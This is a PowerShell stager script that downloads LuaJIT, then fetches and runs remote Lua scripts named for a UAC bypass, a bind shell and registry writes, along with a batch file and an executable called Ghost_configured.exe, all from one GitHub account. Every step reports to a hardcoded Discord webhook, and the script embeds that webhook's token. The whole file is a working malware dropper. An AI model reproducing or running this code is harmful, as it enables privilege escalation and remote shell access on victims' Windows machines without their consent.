# Define paths and URLs
$baseDir = "C:\Users\Public\Documents"
$luaZip = "$baseDir\lua-5.4.2_Win64_bin.zip"
$luaZipUrl = "https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
$luaJitZip = "$baseDir\LuaJIT-2.1.zip"
$luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
$passUACScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/passUAC.lua"
$bindshellScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
$regwriteScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/regwrite.lua"
$bindshellCmdUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.cmd"
$ghostConfigExeUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/Ghost_configured.exe"
$passUACScriptPath = "$baseDir\passUAC.lua"
$bindshellScriptPath = "$baseDir\bindshell.lua"
$regwriteScriptPath = "$baseDir\regwrite.lua"
$bindshellCmdPath = "$baseDir\bindshell.cmd"
$ghostConfigExePath = "$baseDir\Ghost_configured.exe"
$discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
$luaJitPath = "$baseDir\LuaJIT-2.1"
$luaPathDir = "$baseDir\Luapath"
$jitDir = "$luaPathDir\src\jit"
$srcDir = "$luaPathDir\src"
$jitSourceDir = "$luaJitPath"

# Function to send messages to Discord webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )
    $payload = @{
        content = $message
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $payload -ContentType 'application/json'
}

# Function to check if a file exists and wait if it doesn't
function Wait-ForFile {
    param (
        [string]$FilePath,
        [int]$Timeout = 60000
    )
    $startTime = Get-Date
    while (-not (Test-Path -Path $FilePath)) {
        Start-Sleep -Seconds 1
        if ($startTime.AddMilliseconds($Timeout) -lt (Get-Date)) {
            $message = "Timeout waiting for file ${FilePath} to appear."
            Send-DiscordMessage -message $message
            exit 1
        }
    }
}

# Function to get a file using curl
function Get-File {
    param (
        [string]$url,
        [string]$destination
    )
    try {
        $message = "Getting file from $url to $destination..."
        Send-DiscordMessage -message $message
        Start-Process -FilePath "curl" -ArgumentList "-L", $url, "-o", $destination -NoNewWindow -Wait
        Wait-ForFile -FilePath $destination
        $message = "Download completed: $destination"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error getting file from: $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
}

# Function to invoke a command and wait until it's done
function Invoke-And-Wait {
    param (
        [string]$Command,
        [string]$Arguments,
        [string]$Directory
    )
    $currentDir = Get-Location
    try {
        Set-Location -Path $Directory
        $message = "Invoking command: $Command $Arguments in $Directory"
        Send-DiscordMessage -message $message
        Start-Process -FilePath $Command -ArgumentList $Arguments -NoNewWindow -Wait
        $message = "Invocation completed."
        Send-DiscordMessage -message $message
    } finally {
        Set-Location -Path $currentDir
    }
}

# Function to wait for a minute
function Wait-ForMinute {
    Send-DiscordMessage -message "Waiting for 10 seconds before next step..."
    Start-Sleep -Seconds 10
}

# Function to copy files with wait and notification
function Copy-File {
    param (
        [string]$Source,
        [string]$Destination
    )
    try {
        Copy-Item -Path $Source -Destination $Destination -Force
        $message = "Copied $Source to $Destination"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error copying $Source to $Destination $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
}

# Function to get and extract LuaJIT
function Get-And-Extract-LuaJIT {
    if (-not (Test-Path "$luaJitPath\src\luajit.exe")) {
        $message = "Getting LuaJIT ZIP file..."
        Send-DiscordMessage -message $message
        # Get the ZIP file
        if (-not (Test-Path $luaJitZip)) {
            Get-File -url $luaJitUrl -destination $luaJitZip
            Wait-ForMinute

            # Wait for the download to complete
            Wait-ForFile -FilePath $luaJitZip
        }

        if (-not (Test-Path "$luaJitPath")) {
            $message = "Extracting LuaJIT ZIP file..."
            Send-DiscordMessage -message $message
            # Extract the ZIP file
            try {
                Expand-Archive -Path $luaJitZip -DestinationPath $luaJitPath
                $message = "Extraction completed to: $luaJitPath"
                Send-DiscordMessage -message $message
            } catch {
                $message = "Error extracting LuaJIT ZIP file: $(${_})"
                Send-DiscordMessage -message $message
                exit 1
            }
        } else {
            $message = "LuaJIT directory already exists: $luaJitPath"
            Send-DiscordMessage -message $message
        }

        Wait-ForMinute
    } else {
        $message = "LuaJIT executable already exists: $luaJitPath\src\luajit.exe"
        Send-DiscordMessage -message $message
    }
}

# Function to download, wait, and execute the Ghost_configured.exe
function Get-Execute-GhostConfig {
    if (-not (Test-Path $ghostConfigExePath)) {
        $message = "Getting Ghost_configured.exe..."
        Send-DiscordMessage -message $message
        Get-File -url $ghostConfigExeUrl -destination $ghostConfigExePath
        Wait-ForMinute

        $message = "Executing Ghost_configured.exe..."
        Send-DiscordMessage -message $message
        Start-Process -FilePath $ghostConfigExePath -NoNewWindow -Wait
        $message = "Execution of Ghost_configured.exe completed."
        Send-DiscordMessage -message $message
    } else {
        $message = "Ghost_configured.exe already exists But still Downloads and execute: $ghostConfigExePath"
        Send-DiscordMessage -message $message
        Start-Process -FilePath $ghostConfigExePath -NoNewWindow -Wait
        Wait-ForMinute
    }
}

# Get LuaJIT if not already done
Get-And-Extract-LuaJIT

# Download and extract Lua if not already done
if (-not (Test-Path "$baseDir\lua54.exe")) {
    $message = "Getting Lua ZIP file..."
    Send-DiscordMessage -message $message
    # Get the ZIP file
    if (-not (Test-Path $luaZip)) {
        Get-File -url $luaZipUrl -destination $luaZip
        Wait-ForMinute

        # Wait for the download to complete
        Wait-ForFile -FilePath $luaZip
    }

    $message = "Extracting Lua ZIP file..."
    Send-DiscordMessage -message $message
    # Extract the ZIP file
    try {
        Expand-Archive -Path $luaZip -DestinationPath $baseDir
        $message = "Extraction completed to: $baseDir"
        Send-DiscordMessage -message $message
    } catch {
        $message = "Error extracting Lua ZIP file: $(${_})"
        Send-DiscordMessage -message $message
        exit 1
    }
} else {
    $message = "Lua executable already exists: $baseDir\lua54.exe"
    Send-DiscordMessage -message $message
}

# Create the Luapath directory and subdirectories
$luaPathDir = "$baseDir\Luapath"
$srcDir = "$luaPathDir\src"
$jitDir = "$srcDir\jit"

if (-not (Test-Path -Path $luaPathDir)) {
    New-Item -Path $luaPathDir -ItemType Directory -Force
}

if (-not (Test-Path -Path $srcDir)) {
    New-Item -Path $srcDir -ItemType Directory -Force
}

if (-not (Test-Path -Path $jitDir)) {
    New-Item -Path $jitDir -ItemType Directory -Force
}

# Copy LuaJIT JIT files
$jitSourceDir = "$luaJitPath\LuaJIT-2.1\src\jit"
if (-not (Test-Path -Path $jitDir)) {
    New-Item -Path $jitDir -ItemType Directory -Force
}
Copy-File -Source "$jitSourceDir*" -Destination $jitDir
Wait-ForMinute

# Copy luajit.exe and lua51.dll to luapath base directory
Copy-File -Source "$luaJitPath\LuaJIT-2.1\src\luajit.exe" -Destination "$luaPathDir\luajit.exe"
Copy-File -Source "$luaJitPath\LuaJIT-2.1\src\lua51.dll" -Destination "$luaPathDir\lua51.dll"
Wait-ForMinute

# Download Lua scripts and cmd file
$scriptUrls = @{
    "passUAC.lua" = $passUACScriptUrl
    "bindshell.lua" = $bindshellScriptUrl
    "regwrite.lua" = $regwriteScriptUrl
    "bindshell.cmd" = $bindshellCmdUrl
}

foreach ($script in $scriptUrls.Keys) {
    $url = $scriptUrls[$script]
    $path = Join-Path -Path $baseDir -ChildPath $script
    if (-not (Test-Path $path)) {
        Get-File -url $url -destination $path
        Wait-ForMinute
    } else {
        $message = "$script already exists: $path"
        Send-DiscordMessage -message $message
    }
}

# Execute the Lua scripts and cmd file
try {
    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$regwriteScriptPath" -NoNewWindow -Wait
    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$bindshellScriptPath" -NoNewWindow -Wait
    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$passUACScriptPath" -NoNewWindow -Wait
    Start-Process -FilePath "$bindshellCmdPath" -NoNewWindow -Wait
    $message = "Lua scripts and cmd file executed successfully."
    Send-DiscordMessage -message $message
} catch {
    $message = "Error executing scripts and cmd file: $(${_})"
    Send-DiscordMessage -message $message
    Wait-ForMinute
    pause
}
Get-Execute-GhostConfig



